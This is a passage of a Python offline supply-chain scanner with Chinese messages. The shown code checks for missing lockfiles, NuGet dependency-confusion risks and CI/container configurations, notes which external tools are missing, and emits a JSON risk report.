    for path in manifest_by_kind.get("go", []):
        analyze_go(base, path, risks)

    # Simple missing-lock checks for ecosystems whose lock is unambiguous.
    for eco, names, level, note in (
            ("rust", LOCK_NAMES_RUST, "low", "库项目常不提交 Cargo.lock；二进制/应用缺失才是问题"),
            ("ruby", LOCK_NAMES_RUBY, "medium", "Gemfile.lock 缺失会解析到新 gem"),
            ("php", LOCK_NAMES_PHP, "medium", "composer.lock 缺失会解析到新包"),
            ("dotnet", LOCK_NAMES_NET, "medium", "packages.lock.json 缺失，NuGet 解析不可复现"),
    ):
        for path in manifest_by_kind.get(eco, []):
            if not find_near(os.path.dirname(path), base, names):
                add_risk(risks, level, "lockfile", rel(base, path),
                         "%s 清单存在，但没有 %s" % (eco, "/".join(names)),
                         note,
                         "生成并提交对应锁文件，CI 使用锁定还原。",
                         confidence="medium")
    java_manifests = manifest_by_kind.get("java", [])
    if java_manifests and not any(rel(base, p) for p in
                                  [os.path.join(base, n) for n in LOCK_NAMES_GRADLE]
                                  if os.path.isfile(p)):
        add_risk(risks, "low", "lockfile", rel(base, java_manifests[0]),
                 "Maven/Gradle 项目未发现 gradle.lockfile（Maven 默认无锁）",
                 "依赖范围与传递依赖由解析器决定，构建不可完全复现。",
                 "Gradle 启用 dependency locking；Maven 用 dependencyManagement/BOM 并记录解析树。",
                 confidence="medium")

    for rpath in inventory["dockerfiles"]:
        analyze_container(base, os.path.join(base, rpath), risks, is_compose=False)
    for rpath in inventory["compose"]:
        analyze_container(base, os.path.join(base, rpath), risks, is_compose=True)
    for rpath in inventory["workflows"]:
        analyze_workflow(base, os.path.join(base, rpath), risks, hits)
    for rpath in inventory["gitlab"]:
        analyze_gitlab(base, os.path.join(base, rpath), risks)
    for rpath in inventory["jenkins"]:
        analyze_jenkins(base, os.path.join(base, rpath), risks)

    # NuGet dependency confusion: internal-looking package id without a private source.
    nuget_sources = ""
    for rpath in inventory["nuget"]:
        nuget_sources += read_text(os.path.join(base, rpath))
    for path in manifest_by_kind.get("dotnet", []):
        text = read_text(path)
        for idx, line in enumerate(text.splitlines(), 1):
            m = re.search(r'PackageReference\s+Include="([^"]+)"', line)
            if m and PRIVATE_PY.search(m.group(1).split(".")[0]) and "nuget.org" in nuget_sources.lower():
                add_risk(risks, "medium", "dependency-confusion", rel(base, path),
                         "L%d 内部风格包 %s 与 nuget.org 同时配置" % (idx, m.group(1)),
                         "若私有源未优先/未锁定，公共同名包可能被解析。",
                         "在 nuget.config 固定 packageSources 与映射，禁用回退。",
                         line=idx, confidence="medium")

    missing_tools = [t for t in ("git", "syft", "osv-scanner", "grype", "trivy",
                                 "cosign", "semgrep", "docker")
                     if not shutil.which(t)]
    degraded = []
    if "syft" in missing_tools:
        degraded.append({"tool": "syft", "fallback": "未安装：本次只做清单/锁文件盘点；SBOM 需人工用 syft/cdxgen 生成。"})
    if "osv-scanner" in missing_tools and "grype" in missing_tools and "trivy" in missing_tools:
        degraded.append({"tool": "SCA", "fallback": "osv-scanner/grype/trivy 均缺失：CVE 命中需人工到 OSV/GHSA 按版本比对，不能据此判洞。"})
    if "cosign" in missing_tools:
        degraded.append({"tool": "cosign", "fallback": "未安装：镜像签名/来源证明需人工用 cosign verify 或发布页校验。"})
    if "git" in missing_tools:
        degraded.append({"tool": "git", "fallback": "未安装：无法确认 commit；请人工记录 git rev-parse HEAD。"})

    risks.sort(key=lambda x: (LEVEL_ORDER.get(x["level"], 9), x["category"], x["file"]))
    for i, risk in enumerate(risks, 1):
        risk["id"] = "SC-%03d" % i
    hits.sort(key=lambda h: (h["rule"], h["file"], h["line"] or 0))
    counts = {k: sum(1 for r in risks if r["level"] == k)
              for k in ("critical", "high", "medium", "low", "info")}

    result = {
        "schema": SCHEMA,
        "tool": {"name": "sc-check.py", "version": VERSION,
                 "mode": "offline-static", "safe": True,
                 "guarantees": ["read-only", "no network", "no build",
                                "excludes node_modules/vendor/.git"]},
        "target": {"path": public_path(base), "files_scanned": len(files),
                   "truncated": truncated},
        "ok": True,
        "summary": {"risks": counts, "risks_total": len(risks),
                    "high_or_critical": counts["critical"] + counts["high"],
                    "rule_hits_total": len(hits),
                    "ecosystems": sorted(kinds.keys())},
        "inventory": {
            "manifests": inventory["manifests"],
            "locks": inventory["locks"],
            "dockerfiles": inventory["dockerfiles"],
            "compose": inventory["compose"],
            "workflows": inventory["workflows"],
            "gitlab": inventory["gitlab"],
            "jenkins": inventory["jenkins"],
            "npmrc": [rel(base, p) for p in inventory["npmrc"]],
            "pipconf": [rel(base, p) for p in inventory["pipconf"]],
            "nuget": inventory["nuget"],
            "dockerignore": inventory["dockerignore"],
        },
        "risks": risks,
        "rule_hits": hits,
        "degraded": degraded,
        "missing_tools": missing_tools,
        "limits": {
            "max_files": args.max_files,
            "max_depth": args.max_depth,
            "note": "静态线索；可达 CVE、实际签名与镜像层需人工/外部工具复核。",
        },
    }
    text = json.dumps(result, ensure_ascii=False, indent=2)
    print(text)
    if args.out:
        try:
            parent = os.path.dirname(os.path.abspath(args.out))
            if parent and not os.path.isdir(parent):
                os.makedirs(parent, exist_ok=True)
            with open(args.out, "w", encoding="utf-8") as fh:
                fh.write(text + "\n")
        except OSError as exc:
            print(json.dumps({"ok": False, "blocked_at": "out-unwritable",
                              "reason": "无法写 --out：%s" % exc}, ensure_ascii=False))
            return 2
    return 1 if counts["critical"] + counts["high"] else 0


def main(argv):
    ap = argparse.ArgumentParser(
        prog="sc-check.py",
        description="离线供应链检查：锁文件 / 宽版本 / CI 权限与触发器 / action pin / 镜像 tag / 依赖混淆 / 2026 npm worm（SC-101/102/103）。只读文件，不联网、不构建。",
        epilog="示例: python Tool/skill/supply-chain-security/scripts/sc-check.py --path . --out sc.json；"
               "自检: python Tool/skill/supply-chain-security/scripts/sc-check.py --self-test")
    ap.add_argument("--path", default="", help="要扫描的仓库/目录（相对仓库根或绝对路径）")
    ap.add_argument("--max-files", type=int, default=20000, help="最多扫描文件数（默认 20000）")
    ap.add_argument("--max-depth", type=int, default=8, help="最大目录深度（默认 8）")
    ap.add_argument("--out", default="", help="同时把 JSON 写入文件")
    ap.add_argument("--self-test", action="store_true",
                    help="离线自检：内置最小样本，成功时最后一行输出 JSON（含 ok/checks）")
    args = ap.parse_args(argv)
    if args.self_test:
        return self_test()
    if not args.path:
        return emit_error("args", "缺少 --path（或使用 --self-test）")
    try:
        return run(args)
    except ScanError as exc:
        return emit_error(exc.blocked_at, exc.reason)
    except Exception as exc:  # noqa: BLE001
        return emit_error("scan", "%s: %s" % (type(exc).__name__, exc))


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
